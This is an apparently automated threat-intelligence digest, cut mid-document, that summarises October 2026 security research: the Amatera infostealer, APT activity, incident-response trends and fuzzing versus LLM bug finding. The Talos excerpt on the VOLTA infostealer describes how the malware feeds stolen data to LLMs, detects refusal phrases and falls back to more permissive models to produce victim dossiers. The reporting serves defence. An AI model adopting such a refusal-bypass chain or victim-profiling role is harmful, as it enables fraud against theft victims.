PHP2Shell: What to know about two critical PHP flaws Business Security Lessons from Cybersecurity Black Week Share Article Discussion
```

#### Corroborating sources (1)

- **ESET WeLiveSecurity** (threat_research_primary)
  - Title: This month in security with Tony Anscombe – October 2026 edition
  - Published: 2026-10-30T15:03:14+00:00
  - Link: https://www.welivesecurity.com/en/videos/month-security-tony-anscombe-october-2026/
  - Summary: The PHP2Shell disclosure and other major cybersecurity news this month brought into relief the need for well-thought-out cyber-readiness plans

### Cluster 2a9b3cf734 — score 10

- Title: Amatera: How the prolific infostealer works and spreads
- Source: ESET WeLiveSecurity (threat_research_primary)
- Published: 2026-10-29T08:00:00+00:00
- Link: https://www.welivesecurity.com/en/malware/amatera-how-prolific-infostealer-works-spreads/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, phishing_social_eng, ransomware_extortion
- affected_industries: financial_services
- affected_products: Microsoft SharePoint
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, credential_theft
- affected_industries: financial_services
- affected_products: Microsoft SharePoint
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
The malware that topped ESET’s infostealer detections in Latin America in the first half of 2026 is an example of how cybercrime has professionalized
```

#### Full body

```
Malware Amatera: How the prolific infostealer works and spreads The malware that topped ESET’s infostealer detections in Latin America in the first half of 2026 is an example of how cybercrime has professionalized Mario Micucci 29 Oct 2026 • , 6 min. read Infostealers have become an established business, with developers who produce and maintain the product and paying customers who run their own campaigns with them. Amatera – which topped ESET’s infostealer detections in Latin America in the first half of 2026 but targets victims worldwide – shows what this professionalization looks like in practice. Like many other infostealers , Amatera goes after a range of data spanning login credentials, session cookies, tokens, crypto wallet information, messaging data, files, and secrets from development environments. The sheer breadth of the loot shows why infostealers are a mainstay of cybercrime – a single compromise can lead to account hijacking, financial fraud and crypto theft, as well as open the door into the organization where the victim works. Here’s more about where Amatera came from, along with its business model, capabilities, and distribution. What is Amatera? Detected by ESET products as Win/PSW.Amatera, Amatera is a Windows infostealer written in C++ that was first observed in 2024. Since it’s marketed under the malware-as-a-service (MaaS) model, its developers maintain the code, the control panel, and the support infrastructure, while affiliates pay a subscription to use the malware in their campaigns. Given the similarities in their respective code, Amatera is very likely a rebrand of ACR Stealer. Indeed, the latter has a predecessor of its own: a Sekoia investigation in May 2024 described it as an updated version of the GrMsk stealer, offered as a service on underground forums. Rebranding – or releasing an updated version of a piece of malware under a new name – is very common across the MaaS ecosystem, particularly among ransomware operators . They sometimes sell the source code when they shut down their operations to avoid being tracked, or they update and rename it as a ‘business strategy’. In some cases, they leak it so that other malicious actors can reuse it. At any rate, by the end of 2024, Amatera Stealer was already on offer for $199 a month, with support via Telegram.. Figure 1. Amatera stealer being offered through subscription plans and with support via Telegram (Source: X ) Amatera’s capabilities Amatera extracts credentials stored in web browsers, along with cookies, browsing histories, form data, and session tokens. It can also search for and grab sensitive documents and files synced with OneDrive or SharePoint – Microsoft reported a surge in attacks on its enterprise customers between late April and mid-June 2026. Separately, Straiker found that the malware also went after cryptocurrency wallet data by manipulating the clipboard. The malware is also under constant development, and it turns up as the final payload in a wide variety of attack chains. That variety is also typical of MaaS: the developers sell the product, and each affiliate chooses their own way to deliver it. Amatera has spread via compromised websites, search engine ads, targeted emails, fake documents, SVG files, and ClickFix via fake CAPTCHAs . Indeed, several recent analyses of Amatera campaigns worldwide show that one of its key delivery vectors is ClickFix , a social engineering technique that was first documented in 2024 and was quickly picked up by adversaries to distribute a wide range of malware families. Figure 2. Example of a fake pop-up window prompting the victim to copy and execute an instruction on their computer and unwittingly set the compromise process into motion Often, the victim sees a message that mimics a CAPTCHA check or a browser error and warns them of supposed technical problems that can be fixed by copying a command and running it on their computer. The victim’s own keystrokes then set the compromise in motion.
```

#### Corroborating sources (1)

- **ESET WeLiveSecurity** (threat_research_primary)
  - Title: Amatera: How the prolific infostealer works and spreads
  - Published: 2026-10-29T08:00:00+00:00
  - Link: https://www.welivesecurity.com/en/malware/amatera-how-prolific-infostealer-works-spreads/
  - Summary: The malware that topped ESET’s infostealer detections in Latin America in the first half of 2026 is an example of how cybercrime has professionalized

### Cluster 5a153571ac — score 10

- Title: ESET APT Activity Report Q2 2026–Q3 2026
- Source: ESET WeLiveSecurity (threat_research_primary)
- Published: 2026-10-28T09:45:00+00:00
- Link: https://www.welivesecurity.com/en/eset-research/eset-apt-activity-report-q2-2026-q3-2026/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage
- affected_industries: financial_services, government, manufacturing_industrial, telecommunications
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: apt_espionage
- affected_industries: financial_services, government, manufacturing_industrial, telecommunications
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
An overview of the activities of selected APT groups investigated and analyzed by ESET Research in Q2 2026 and Q3 2026
```

#### Full body

```
ESET Research ESET APT Activity Report Q2 2026–Q3 2026 An overview of the activities of selected APT groups investigated and analyzed by ESET Research in Q2 2026 and Q3 2026 Jean-Ian Boutin 28 Oct 2026 • , 6 min. read ESET APT Activity Report Q2 2026–Q2 2026 summarizes notable activities of selected advanced persistent threat (APT) groups documented by ESET researchers between April and September 2026. The operations presented here reflect the broader threat landscape observed during this period and highlight some of its key trends and developments. They represent only a subset of the cybersecurity intelligence made available to customers of ESET Threat Intelligence APT Reports. During the monitored period, China-aligned groups conducted intelligence-collection operations primarily against governmental targets. FamousSparrow kept up its monitoring in South America, just as in the previous reporting period. In Southeast Asia and Oceania, China-aligned threat actors ran campaigns that appear to support Chinese law enforcement efforts against organized crime in the region. One threat actor targeted hotels in Palau, which seems to be increasingly used as a base for fraud-related organized crime. SlippyNunchucks deployed its DarkVigil toolset in Sri Lanka against Chinese-speaking individuals connected to fraud schemes, likely in the context of broader regional law enforcement efforts against financial crime. As scam compounds have become an issue for countries neighboring China, with direct negative effects on China itself, it is likely that China-aligned APT groups have supported law enforcement efforts in this area. Another, broader cluster of activity targeted Taiwanese organizations operating in the semiconductor industry. This focus on Taiwan’s semiconductor sector is consistent with long-running Chinese industrial espionage priorities, and the strategic importance of semiconductor supply chains to both economic competition and national security. Middle East-aligned activity increased compared with the previous reporting period, driven mainly by the return of several established Iran-aligned groups. In the previous period, activity from these groups had declined, most likely because internet restrictions imposed by the Iranian regime hindered their own ability to operate effectively. FilthyFeline, a subgroup of OilRig, and MuddyWater resumed operations after a quieter period, with most activity directed at entities in Israel across multiple sectors; a smaller number of US companies were also affected. FilthyFeline also appears to have taken over activity against a cellular data service provider in Uzbekistan that had previously been compromised by BladedFeline, another OilRig subgroup. In parallel, we analyzed new or updated malware, suggesting renewed development activity within parts of the Iran-aligned ecosystem. We also discovered activity by Arid Viper, a Hamas-affiliated threat actor, against what appears to be the Palestinian Authority’s Ministry of Foreign Affairs and Expatriates or an affiliated governmental entity. Given the ongoing US-led peace process, as well as the long-standing rivalry between Hamas and the Palestinian Authority, this activity was potentially intended to collect intelligence on the Palestinian Authority’s diplomatic position and internal thinking regarding negotiations to reduce hostilities in the region. North Korea-aligned threat actors did not deviate significantly from the types of targets seen in previous reporting periods. These include primarily technology and cryptocurrency companies, software developers, and other opportunistic targets. Alongside South Korea, Ukraine has become increasingly prominent among North Korea-aligned targets. This is likely related to growing ties between Russia and North Korea, and North Korea’s increasing involvement in Russia’s war against Ukraine, not only through indirect military support (munitions, etc.) but also through the deployment of North Korean so
```

#### Corroborating sources (1)

- **ESET WeLiveSecurity** (threat_research_primary)
  - Title: ESET APT Activity Report Q2 2026–Q3 2026
  - Published: 2026-10-28T09:45:00+00:00
  - Link: https://www.welivesecurity.com/en/eset-research/eset-apt-activity-report-q2-2026-q3-2026/
  - Summary: An overview of the activities of selected APT groups investigated and analyzed by ESET Research in Q2 2026 and Q3 2026

### Cluster 1e5a485e57 — score 10

- Title: Appraisal by AI: Model-driven victim prioritization in the VOLTA infostealer
- Source: Cisco Talos (threat_research_primary)
- Published: 2026-10-31T12:00:00+00:00
- Link: https://blog.talosintelligence.com/appraisal-by-ai-model-driven-victim-prioritization-in-the-volta-infostealer/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft
- affected_industries: financial_services
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: credential_theft
- affected_industries: financial_services
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
The self-deleting VOLTA infostealer steals credentials, sessions, and cryptocurrency wallets. Then, it uses LLMs to profile victims and rank their most valuable assets.
```

#### Full body

```
Appraisal by AI: Model-driven victim prioritization in the VOLTA infostealer By Ryan Fetterman Saturday, October 31, 2026 08:00 AI Threat Spotlight Stealer VOLTA is a mature stealer implant with an optional AI-integration layer. After stealing credentials, sessions, and cryptocurrency wallets, VOLTA sends a structured evidence bundle to an LLM to rank the victim’s assets by monetization value. If a model refuses to perform the target assessment, VOLTA fails over to a three-model chain, implying a direct engineering effort and expectation of hitting model guardrails. This stealer is self-deleting, and there is no attacker-owned infrastructure. The novelty in the AI-integration is that it is not supporting a traditional malware capability but working as an intelligence analyst on behalf of the operator. There is a new idea in the cybercrime world — cast a wide net, steal everything, and let AI sort out the specifics. A new malware self-named “VOLTA-AUTODOXER,” surfaced through the CAIRN research effort , is a self-deleting Windows infostealer that augments its post-theft workflow with an LLM-powered victim-profiling stage. After harvesting the standard stealer haul, including browser passwords; cookies; payment cards; cryptocurrency wallet seed phrases; Discord, Telegram, Steam, and Roblox sessions; Microsoft OAuth tokens; SSH and cloud-provider keys; Wi-Fi profiles; and screenshots, VOLTA builds a structured evidence bundle about the person behind the machine. This bundle contains geolocation and home address, employer and employer domain, inferred birth year, card last-4 digits, Slack workspaces, document authorship metadata, iPhone backup indicators, and a live Roblox account valuation. It then uses stolen session access to enrich that bundle further: searching the victim's Gmail for purchase receipts to corroborate a home address, pulling UberEats and DoorDash order history, and enriching Discord accounts via the stolen token. The bundle is serialized and POSTed to OpenRouter under a system prompt that instructs the model to act as "a forensic intelligence analyst drafting a target assessment." The required output includes a section titled “WHAT THEY'RE WORTH” with valuables ranked by monetization with a low/medium/high tier, and a section on “THEIR OPSEC” containing an assessment of the victim's security posture and password hygiene. The model is the operator's triage analyst; it turns a raw credential log into a prioritized and citation-backed dossier of the victim and their monetizable assets. Figure 1. The VOLTA-AUTODOXER workflow. The AI configuration: “Go deep, not wide... Be blunt, specific, accurate.” VOLTA uses a multi-model architecture to fall back resiliently if it hits a model’s refusal, checking each response for phrases like “I can’t” or “I’m not able,” before passing on to a chain of up to three models. Endpoint https[ :]// openrouter [ .]ai/ api /v1/chat/completions Default model anthropic/claude-opus-4.6 Fallback chain moonshotai /kimi-k2 → google/gemini-2.5-flash Temperature 0.2 — deterministic, consistent output Request format Hand-assembled JSON; no SDK; User-Agent Mozilla/5.0 Figure 2. Hardcoded model selection. Figure 3. Failover model selection to kimi-k2, and then gemini-2.5-flash. Model temperate controls the randomness and predictability of LLM-generated text. The low hardcoded temperature value (0.2) suggests the attacker is emphasizing accuracy and consistency. The malware also employs a chain of cascading models in the event of failures. This multi-model architecture suggests that the operator is anticipating encountering refusals, with the fallback pivoting to a few, smaller, and more permissive models. The system prompt directly reveals the operator’s use case: Produce a concise analytical assessment of the victim’s suitability as a target, backed by an auditable trail of citations. Figure 4. VOLTA's raw system prompt. The prompt also asks for something out of the ordinary, but that agents exc
```

#### Corroborating sources (1)

- **Cisco Talos** (threat_research_primary)
  - Title: Appraisal by AI: Model-driven victim prioritization in the VOLTA infostealer
  - Published: 2026-10-31T12:00:00+00:00
  - Link: https://blog.talosintelligence.com/appraisal-by-ai-model-driven-victim-prioritization-in-the-volta-infostealer/
  - Summary: The self-deleting VOLTA infostealer steals credentials, sessions, and cryptocurrency wallets. Then, it uses LLMs to profile victims and rank their most valuable assets.

### Cluster 084d29f299 — score 10

- Title: IR trends Q3 2026: Actors impersonate IT help desks in vishing attacks as ransomware activity increases
- Source: Cisco Talos (threat_research_primary)
- Published: 2026-10-29T14:00:00+00:00
- Link: https://blog.talosintelligence.com/ir-trends-q3-2026/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, phishing_social_eng, ransomware_extortion, web_shell_backdoor
- actor_attribution: Rhysida, Salt Typhoon
- affected_industries: financial_services, telecommunications
- affected_products: Cisco
- cve_ids: CVE-2023-20198
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, apt_espionage, web_shell_backdoor
- actor_attribution: Rhysida, Salt Typhoon
- affected_industries: financial_services, telecommunications
- affected_products: Cisco
- cve_ids: CVE-2023-20198
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Phishing remained the leading initial access technique, while percentage of ransomware and pre-ransomware cases increased. Finance and public administration tied as the top-targeted industries.
```

#### Full body

```
IR trends Q3 2026: Actors impersonate IT help desks in vishing attacks as ransomware activity increases By Aliza Johnson Thursday, October 29, 2026 10:00 Talos IR trends Cisco Talos Incident Response CTIR trends Phishing remained the leading initial access technique, appearing in slightly over one-third of all Cisco Talos Incident Response (Talos IR) engagements — a decrease from over 50 percent last quarter. In addition to traditional phishing links and attachments, we observed numerous threat actors conducting voice phishing (vishing) in tandem with IT desk impersonation to socially engineer the victim into allowing remote access via a legitimate remote monitoring and management (RMM) tool. Exploitation of public-facing applications was the next most common vector, accounting for one-third of Talos IR engagements. Threat actors predominantly targeted edge devices such as security gateways and remote network management interfaces. These are critical components within enterprise environments, often responsible for managing authentication, network traffic, or sensitive data. Compromising them can provide broad access to internal networks or user credentials. Ransomware and pre-ransomware incidents made up 27 percent of engagements in Q3 2026, an increase from a maximum of 20 percent seen in the previous four quarters. Talos responded to attacks involving prolific, technologically advanced, and well-established ransomware-as-a-service (RaaS) variants such as The Gentlemen, Qilin, and Rhysida, as well as Interlock, which operates as a closed group. Threat actors predominantly chose to disable endpoint detection and response (EDR) systems, often by exploiting vulnerable drivers or using Windows Defender Application Control (WDAC). Additionally, we observed the emerging ransomware variant VYPR, whose operator(s) tested a range of tactics, techniques, and procedures (TTPs) instead of following a standard attack method or affiliate playbook. Talos experts discuss some of the biggest trends from the quarter in this video Salt Typhoon-affiliated threat actors exploit public-facing application vulnerabilities for cyber espionage Talos IR continues to see prolonged cyber espionage intrusions targeting the telecommunications sector. Talos attributed most of these intrusions with high confidence to China state-sponsored threat actors, including Salt Typhoon. The attackers in these intrusions routinely gain initial access by leveraging valid credentials and exploiting a known vulnerability (CVE-2023-20198) in publicly accessible web-based management interfaces—two of the most frequently observed initial access vectors this quarter. In one campaign, the threat actor deployed BadCandy, a malicious web shell implant known to be leveraged by Salt Typhoon, to maintain persistent and stealthy remote access. The adversaries continue to employ living-off-the-land (LOTL) tactics, leveraging legitimate network infrastructure features — such as VPN access, traffic mirroring, and management protocols — to establish backdoors, exfiltrate data, and conduct reconnaissance. Exploiting a vulnerability in the web-based management interface, they created privileged accounts, disabled logging to conceal their activity, and altered configurations to maintain persistence, blending their actions with normal administrative operations to evade detection. These intrusions revealed several security weaknesses in the victim environment, including reliance on password-only authentication without evidence of multi-factor authentication (MFA), use of legacy and weak management protocols (such as plaintext SNMP and outdated VPN encryption), and inadequate credential management practices. Attackers were able to create and abuse privileged accounts, disable logging, and manipulate configuration settings without encountering effective security barriers, enabling persistent and stealthy access. The absence of strong MFA and robust credential management are two of the most fre
```

#### Corroborating sources (1)

- **Cisco Talos** (threat_research_primary)
  - Title: IR trends Q3 2026: Actors impersonate IT help desks in vishing attacks as ransomware activity increases
  - Published: 2026-10-29T14:00:00+00:00
  - Link: https://blog.talosintelligence.com/ir-trends-q3-2026/
  - Summary: Phishing remained the leading initial access technique, while percentage of ransomware and pre-ransomware cases increased. Finance and public administration tied as the top-targeted industries.

### Cluster bf768c12ec — score 10

- Title: From federal SOCs to Talos: Ryan Fetterman on practical security research
- Source: Cisco Talos (threat_research_primary)
- Published: 2026-10-27T10:00:21+00:00
- Link: https://blog.talosintelligence.com/from-federal-socs-to-talos-ryan-fetterman-on-practical-security-research/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage
- affected_industries: education, government
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: apt_espionage
- affected_industries: government, education
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
What does it mean to be "blue collar" for the blue team? Ryan Fetterman discusses the realities of detection engineering, and shares his philosophy on building a career in security without burning out.
```

#### Full body

```
From federal SOCs to Talos: Ryan Fetterman on practical security research By Amy Ciminnisi Tuesday, October 27, 2026 06:00 Humans of Talos What does it mean to be "blue collar" for the blue team? Amy sat down with security researcher Ryan Fetterman to discuss his journey from federal agency work to his new role at Talos. He shares the realities of detection engineering — including the creative, often frustrating ways attackers evolve their tactics to stay one step ahead of traditional defenses. Beyond the technical grind, Ryan shares his philosophy on building a career in security without burning out. From the value of project-based learning to the importance of finding time to step away from the keyboard, here's Ryan's take on what it really means to navigate today's cybersecurity industry. Amy Ciminnisi: Tell me a little bit about the journey that has taken you to Talos, from early on in your career through to now. How did you get here? I actually don't know that much about it. Ryan Fetterman: I've been doing security about 15 years now, and my career was largely shaped by where I started in the DC area. I spent about a decade there. I started out in consulting and then pivoted over to research, but that was a great place to get started. I got a lot of great experience in federal agencies and government consulting, continued my education down there, got trained up, got certifications and things like that. And that was where I got my first exposure to doing actual security operations, which is what I really stuck with. It was my first exposure to Splunk. Querying lots of log data and building visualizations and analytics in Splunk was the first time in my career that I felt it was kind of my natural inclination. It seems like it should have been more obvious to me looking back on it, but it's something that I try to explain to people a lot. When you first get into security, there's a desire to kind of find your specialization and start working towards it. But in my experience, it's just not something that you can rush. I met the people connected with that space, which eventually led to me going to work for Splunk. I worked on the Splunk research team, SURGe. And then after the Cisco acquisition of Splunk, I ultimately became reorganized into Talos. AC: I'm sure there have been so many challenges, so many obstacles in your way as you're trying to do this research. Can you share one that you've faced and how it shaped your perspective on cybersecurity? RF: Something that stuck with me was actually my first advanced persistent threat (APT) incident. Now, you can look this up. It's called Pandora Song if you search for the C2. I was in the DC area working in a federal SOC, and I was doing some of the first host-based analytics at the time, which have now become kind of the concentration of a lot of detection. Engineering and analytics are host-based, so this was kind of pioneering at the time. I was looking at a lot of host-based sensors and writing analytics in Splunk, actually, and we had been tipped off to this incident by a third party. I was looking through the details of the incident and how the attacker was carrying out the progression of their attack... Want to see more? Watch the full interview , and don’t forget to subscribe to our YouTube channel for future episodes of Humans of Talos. Share this post Related Content Black Hat special: Rewind and revisit July 30, 2026 06:00 Amy looks back at the incredible journeys that brought past guests to the world of threat intelligence. Martin Lee: Running through the Arctic (and the threat landscape) July 1, 2026 06:00 Ever wonder how someone goes from studying human viruses to leading cybersecurity teams? In this Humans of Talos, we’re joined by Martin Lee, EMEA Lead, to talk about his journey into the industry. Winning the cyber marathon with Tony Giandomenico June 4, 2026 08:05 Tony Giandomenico, Senior Director of Product Management, joins Amy to discuss the Talos Threat Hun
```

#### Corroborating sources (1)

- **Cisco Talos** (threat_research_primary)
  - Title: From federal SOCs to Talos: Ryan Fetterman on practical security research
  - Published: 2026-10-27T10:00:21+00:00
  - Link: https://blog.talosintelligence.com/from-federal-socs-to-talos-ryan-fetterman-on-practical-security-research/
  - Summary: What does it mean to be "blue collar" for the blue team? Ryan Fetterman discusses the realities of detection engineering, and shares his philosophy on building a career in security without burning out.

### Cluster 9839749b4a — score 10

- Title: How Rapid7 InsightGovCloud Supports BOD 22-01 Compliance
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-10-28T13:16:39+00:00
- Link: https://www.rapid7.com/blog/post/pt-insightgovcloud-supports-bod-22-01-compliance
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: government
- affected_products: AWS, Azure
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- affected_industries: government
- affected_products: AWS, Azure
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
An introduction to CISA’s BOD 22-01 Issued nearly four years ago, the U.S. Cybersecurity and Infrastructure Security Agency (CISA) Binding Operational Directive 22-01 (BOD 22-01) has been adopted across both public and private sector organizations as a framework to ensure timely remediation of vulnerabilities being exploited by adversaries. By establishing a catalog of known exploited vulnerabilities (KEVs) and emphasizing a risk-based, prioritized approach, it provides a clear model for organizations to strengthen their cybersecurity posture and reduce exposure to real-world threats. InsightGovCloud , Rapid7’s FedRAMP-authorized suite of security solutions, helps organizations implement BOD 22-01 by providing automated vulnerability scanning, real-time alerts for KEVs, and reporting aligned with regulatory requirements. Public and private sector teams can quickly identify at-risk assets, prioritize remediation efforts based on active exploitation, and maintain an auditable record of c
```

#### Full body

```
Compliance How Rapid7 InsightGovCloud Supports BOD 22-01 Compliance Rapid7 Oct 28, 2026 | Last updated on Oct 28, 2026 | 3 min read DISCOVER INSIGHTGOVCLOUD How Rapid7 InsightGovCloud Supports BOD 22-01 Compliance Table of contents How Rapid7 InsightGovCloud Supports BOD 22-01 Compliance DISCOVER INSIGHTGOVCLOUD Table of contents An introduction to CISA’s BOD 22-01 Issued nearly four years ago, the U.S. Cybersecurity and Infrastructure Security Agency (CISA) Binding Operational Directive 22-01 (BOD 22-01) has been adopted across both public and private sector organizations as a framework to ensure timely remediation of vulnerabilities being exploited by adversaries. By establishing a catalog of known exploited vulnerabilities (KEVs) and emphasizing a risk-based, prioritized approach, it provides a clear model for organizations to strengthen their cybersecurity posture and reduce exposure to real-world threats. InsightGovCloud , Rapid7’s FedRAMP-authorized suite of security solutions, helps organizations implement BOD 22-01 by providing automated vulnerability scanning, real-time alerts for KEVs, and reporting aligned with regulatory requirements. Public and private sector teams can quickly identify at-risk assets, prioritize remediation efforts based on active exploitation, and maintain an auditable record of compliance. By leveraging our secure, cloud-based platform, organizations gain continuous visibility, streamlined vulnerability management, and the confidence that remediation aligns with federal cybersecurity standards. How InsightGovCloud stacks up against key BOD 22-01 requirements Requirement 1: Maintain continuous inventory and visibility InsightVM, included in the suite, supports continuous and automated discovery of both external and internal assets through Discovery Connections, which allow organizations to continuously poll network sources like Active Directory, AWS, and Azure to enumerate connected hosts and launch scans. For cloud environments, Rapid7 InsightCloudSec will continuously inventory the entire environment for the creation of new resources and automatically scan and assess those resources against compliance frameworks. Rapid7 also maintains up-to-date inventory of CISA KEVs with an industry leading 90% coverage for both on-premise and cloud based host vulnerabilities. Requirement 2: Remediate CISA KEV findings on a prioritized schedule Continuous ingestion of CISA KEV catalog by Rapid7 ensures that detection and prioritization of KEV’s can be streamlined and native to one platform. Automatically detect and triage assets with KEVs across cloud and hybrid environments. Prioritize CISA KEV’s across your entire environment and establish remediation projects to quickly and collaboratively remediate KEVs. Requirement 3: Establish policies and enforcement Collaborative remediation and compliance goals automatically track and assign vulnerabilities to the right teams with organizational defined timelines and real time dashboards to measure progress. Requirement 4: Automate reporting Rapid7 has predefined exports in Cyberscope XML reporting format for seamless ingestion into reports for CyberScope submissions as per CyberScope Automated Data Feeds Submission Manual published by the U.S. Office of Management and Budget. Built-in audit trail to demonstrate adherence with BOD 22-01. Why agencies and contractors choose InsightGovCloud Rapid7 InsightGovCloud is designed to support the rigorous requirements of state and local government agencies. The benefits are many, but among the top are its deployment into a FedRAMP Authorized environment – meeting federal security and compliance requirements at every level – its seamless integration into an existing security ecosystem, and its out-of-the-box alignment with CISA and CMMC security mandates. Agencies and contractors enjoy a future-proof tool in that Rapid7 is continuously updating against the ever-growing KEV catalog, as well as unmatched visibility and control t
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: How Rapid7 InsightGovCloud Supports BOD 22-01 Compliance
  - Published: 2026-10-28T13:16:39+00:00
  - Link: https://www.rapid7.com/blog/post/pt-insightgovcloud-supports-bod-22-01-compliance
  - Summary: An introduction to CISA’s BOD 22-01 Issued nearly four years ago, the U.S. Cybersecurity and Infrastructure Security Agency (CISA) Binding Operational Directive 22-01 (BOD 22-01) has been adopted across both public and private sector organizations as a framework to ensure timely remediation of vulnerabilities being exploited by adversaries. By establishing a catalog of known exploited vulnerabilities (KEVs) and emphasizing a risk-based, prioritized approach, it provides a clear model for organizations to strengthen their cybersecurity posture and reduce exposure to real-world threats. InsightGovCloud , Rapid7’s FedRAMP-authorized suite of security solutions, helps organizations implement BOD 22-01 by providing automated vulnerability scanning, real-time alerts for KEVs, and reporting aligned with regulatory requirements. Public and private sector teams can quickly identify at-risk assets, prioritize remediation efforts based on active exploitation, and maintain an auditable record of c

### Cluster 7b747b7dab — score 10

- Title: Fuzzers vs. AI: Comparing Fuzzilli and BigSleep on JavaScript Engines
- Source: Google Project Zero (offensive_vulnerability_research)
- Published: 2026-10-27T07:00:00+00:00
- Link: https://projectzero.google/2026/10/fuzzing-v-AI.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Summary Project Zero compared two automated tools used by Google to find vulnerabilities in Chrome’s JavaScript engine, V8, on a regular basis. Fuzzilli is a generative JavaScript engine fuzzer and BigSleep is an LLM-based bug finding system. In the past six months, BigSleep found more vulnerabilities than Fuzzilli (45 versus 37) with a 25% overlap in the specific bugs reported. Since this comparison methodology has a tendency to underestimate overlap, we also performed dedicated experiments to test theoretical overlap in vulnerabilities reported since 2023. These experiments estimated overlap at roughly 60%. Regardless of which value is accurate, a substantial portion of vulnerabilities were discoverable by only LLMs or only fuzzing. While it is extremely promising that LLMs have become able to find so many vulnerabilities so quickly, fuzzing and LLMs are still complementary approaches. We recommend vendors perform both fuzzing and agentic analysis of their code to maximize the number
```

#### Full body

```
Summary Project Zero compared two automated tools used by Google to find vulnerabilities in Chromeâs JavaScript engine, V8, on a regular basis. Fuzzilli is a generative JavaScript engine fuzzer and BigSleep is an LLM-based bug finding system. In the past six months, BigSleep found more vulnerabilities than Fuzzilli (45 versus 37) with a 25% overlap in the specific bugs reported. Since this comparison methodology has a tendency to underestimate overlap, we also performed dedicated experiments to test theoretical overlap in vulnerabilities reported since 2023. These experiments estimated overlap at roughly 60%. Regardless of which value is accurate, a substantial portion of vulnerabilities were discoverable by only LLMs or only fuzzing. While it is extremely promising that LLMs have become able to find so many vulnerabilities so quickly, fuzzing and LLMs are still complementary approaches. We recommend vendors perform both fuzzing and agentic analysis of their code to maximize the number of vulnerabilities that get reported before they impact users. Introduction Fuzzing has long been successfully applied to software projects such as Chrome or V8 (Chromeâs JavaScript engine) to detect bugs. Recently, the arrival of powerful LLMs able to read, reason about, and write code is causing a transformative change to software development and software security. With hundreds, sometimes thousands of new bugs and vulnerabilities having been discovered in well-fuzzed targets, a natural question arises: how do new LLMs compare to âtraditionalâ fuzzers? Are they starting to replace them or do the two approaches complement each other? To help answer this, we look at three key questions: How many bugs does each approach find in the real world? What is the overlap between the two approaches? What is the âshapeâ of bugs discovered by one system but not the other? For this blog post, we will limit ourselves to two concrete systems: Fuzzilli , a JavaScript engine fuzzer, and BigSleep , an agentic bug finding system. Both of these systems run in production and automatically look for bugs in newly added code, which makes them fairly directly comparable. Specifically, Fuzzilli runs continuously across many instances, with the first ones usually picking up new changes within a few hours, while BigSleep currently runs once per day and is prompted to review new commits and write proof-of-concept testcases for any bugs it discovers. Both systems report bugs through Clusterfuzz , which will do basic crash triaging, then file bug reports in Chromeâs issue tracker. We also limit ourselves to V8 as a target, a high-performance JavaScript and WebAssembly engine with a sophisticated and mature testing and fuzzing setup. In particular, Fuzzilli is a special-purpose fuzzing tool designed to find bugs in these engines. The usually complicated nature of these bugs makes for an interesting âplaygroundâ to compare the two approachesâ ability to find deep and complex bugs in well-tested software. We leave it to future work to perform similar analysis on a broader set of targets, fuzzers, and agentic bug finding systems. We will now look into each of the three main questions in a dedicated section. Each section will first summarize the general approach, then describe the methodology in detail (often as bullet points, so you can skip those blocks if you donât care too much about the details) before exploring the results. We conclude with an attempt at interpreting the results to get a picture of the current state of fuzzing vs. AI. Part 1: Production Statistics This is the simplest part to analyze, although with some caveats weâll see in a bit. The basic idea is to query issues from Chromiumâs bugtracker (where V8 bugs are tracked) and extract various statistics from there. This is especially easy since thereâs a dedicated hotlist for each of the two systems. We limit our analysis to the six months from April to September 2026 as the automatic
```

#### Corroborating sources (1)

- **Google Project Zero** (offensive_vulnerability_research)
  - Title: Fuzzers vs. AI: Comparing Fuzzilli and BigSleep on JavaScript Engines
  - Published: 2026-10-27T07:00:00+00:00
  - Link: https://projectzero.google/2026/10/fuzzing-v-AI.html
